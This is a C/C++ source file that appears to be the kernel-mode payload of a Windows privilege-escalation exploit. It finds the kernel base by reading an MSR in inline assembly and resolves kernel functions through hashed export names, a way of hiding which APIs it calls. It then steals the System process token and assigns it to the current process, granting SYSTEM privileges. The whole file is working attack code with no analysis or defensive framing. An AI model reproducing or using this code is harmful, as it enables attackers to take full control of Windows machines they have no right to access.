#include <windows.h>
#include <stdio.h>
#pragma warning(push)
#pragma warning(disable:4005)
#include "ntdll.h"
#pragma warning(pop)
#include <shlwapi.h>
#include <shlobj.h>
#include <tlhelp32.h>

#include "utils.h"
#include "zdisasm.h"
#include "kernelshell.h"
#include "ntoskrnl.h"

BOOL bKernelCode = FALSE;

ULONG GetKernelBase(void)
{
	ULONG Base;

	__asm
	{
		push 0x76
		pop ecx
		inc ch
		rdmsr
nx:
		and ax,0xf001
		dec eax
		cmp word ptr [eax],0x5a4d
		jnz nx
		mov Base,eax
	}
	
	return Base;
}

ULONG CalcHash(char *str)
{
    ULONG hash = 0;
    char *s = str;

    while (*s) 
    {
        hash = ((hash << 7) & (ULONG)-1) | (hash >> (32 - 7));
        hash = hash ^ *s;

        s++;
    }

    return hash;
}

PVOID KernelGetProcAddrEx(ULONG ModuleBase, ULONG Function)
{
    PIMAGE_NT_HEADERS pHeaders = (PIMAGE_NT_HEADERS)((ULONG)ModuleBase + ((PIMAGE_DOS_HEADER)ModuleBase)->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY pImageExport = (PIMAGE_EXPORT_DIRECTORY)RVA_TO_VA(ModuleBase,pHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    PULONG pAddrOfFunctions = (PULONG)((ULONG)ModuleBase + pImageExport->AddressOfFunctions);
    PSHORT pAddrOfOrdinals = (PSHORT)((ULONG)ModuleBase + pImageExport->AddressOfNameOrdinals);
    PULONG pAddrOfNames = (PULONG)((ULONG)ModuleBase + pImageExport->AddressOfNames);

    for (ULONG i = 0; i < pImageExport->NumberOfNames; i++)
    {
		if (CalcHash((PCHAR)ModuleBase + pAddrOfNames[i]) == Function)
		{
			return (PVOID)((PCHAR)ModuleBase + pAddrOfFunctions[pAddrOfOrdinals[i]]);
        }
    }

    return NULL;
}

template <ULONG h, ULONG hash>
inline PVOID pushargEx()
{    
    typedef PVOID (__stdcall *newfunc)();
    newfunc func = (newfunc)KernelGetProcAddrEx(GetKernelBase(), hash);

    return func();
}

template <ULONG h, ULONG hash, class A>
inline PVOID pushargEx(A a1)
{    
    typedef PVOID (__stdcall *newfunc)(A);
    newfunc func = (newfunc)KernelGetProcAddrEx(GetKernelBase(), hash);

    return func(a1);
}

template <ULONG h, ULONG hash, class A, class B>
inline PVOID pushargEx(A a1,  B a2)
{    
    typedef PVOID (__stdcall *newfunc)(A, B);
    newfunc func = (newfunc)KernelGetProcAddrEx(GetKernelBase(), hash);

    return func(a1,a2);
}

template <ULONG h, ULONG hash, class A, class B, class C>
inline PVOID pushargEx(A a1,  B a2, C a3)
{
    typedef PVOID (__stdcall *newfunc)(A, B, C);
    newfunc func = (newfunc)KernelGetProcAddrEx(GetKernelBase(), hash);

    return func(a1,a2,a3);
}

template <ULONG h, ULONG hash, class A, class B, class C, class D>
inline PVOID pushargEx(A a1, B a2, C a3, D a4)
{    
    typedef PVOID (__stdcall *newfunc)(A, B, C, D);
    newfunc func = (newfunc)KernelGetProcAddrEx(GetKernelBase(), hash);

    return func(a1,a2,a3,a4);
}

template <ULONG h, ULONG hash, class A, class B, class C, class D, class E>
inline PVOID pushargEx(A a1, B a2, C a3, D a4, E a5)
{    
    typedef PVOID (__stdcall *newfunc)(A, B, C, D, E);
    newfunc func = (newfunc)KernelGetProcAddrEx(GetKernelBase(), hash);

    return func(a1, a2, a3, a4, a5);
}

template <ULONG h, ULONG hash, class A, class B, class C, class D, class E, class F>
inline PVOID pushargEx(A a1, B a2, C a3, D a4, E a5, F a6)
{    
    typedef PVOID (__stdcall *newfunc)(A, B, C, D, E, F);
    newfunc func = (newfunc)KernelGetProcAddrEx(GetKernelBase(), hash);

    return func(a1, a2, a3, a4, a5, a6);
}

template <ULONG h, ULONG hash, class A, class B, class C, class D, class E, class F, class G>
inline PVOID pushargEx(A a1, B a2, C a3, D a4, E a5, F a6, G a7)
{    
    typedef PVOID (__stdcall *newfunc)(A, B, C, D, E, F, G);
    newfunc func = (newfunc)KernelGetProcAddrEx(GetKernelBase(), hash);

    return func(a1, a2, a3, a4, a5, a6, a7);
}

VOID KernelGetSystemPrivileges()
{
	HANDLE TokenHandle;
	HANDLE NewTokenHandle;
	PROCESS_ACCESS_TOKEN Token;
	HANDLE hProcess;
	CLIENT_ID ClientId;
	OBJECT_ATTRIBUTES oaAttr;

	ClientId.UniqueProcess = (HANDLE)4;
	ClientId.UniqueThread = 0;

	InitializeObjectAttributes(&oaAttr,NULL,0,NULL,NULL);
	if (NT_SUCCESS(GZwOpenProcess(&hProcess,PROCESS_ALL_ACCESS,&oaAttr,&ClientId)))
	{
		if (NT_SUCCESS(GZwOpenProcessToken(hProcess,TOKEN_ALL_ACCESS,&TokenHandle)))
		{
			if (NT_SUCCESS(GZwDuplicateToken(TokenHandle,TOKEN_ASSIGN_PRIMARY,0,FALSE,TokenPrimary,&NewTokenHandle)))
			{
				Token.Token = NewTokenHandle;
				Token.Thread = 0;
	            
				if (NT_SUCCESS(GZwSetInformationProcess(NtCurrentProcess(),ProcessAccessToken,&Token,sizeof(Token))))
				{
					bKernelCode = TRUE;
				}

				GZwClose(NewTokenHandle);
			}

			GZwClose(TokenHandle);
		}

		GZwClose(hProcess);
	}
}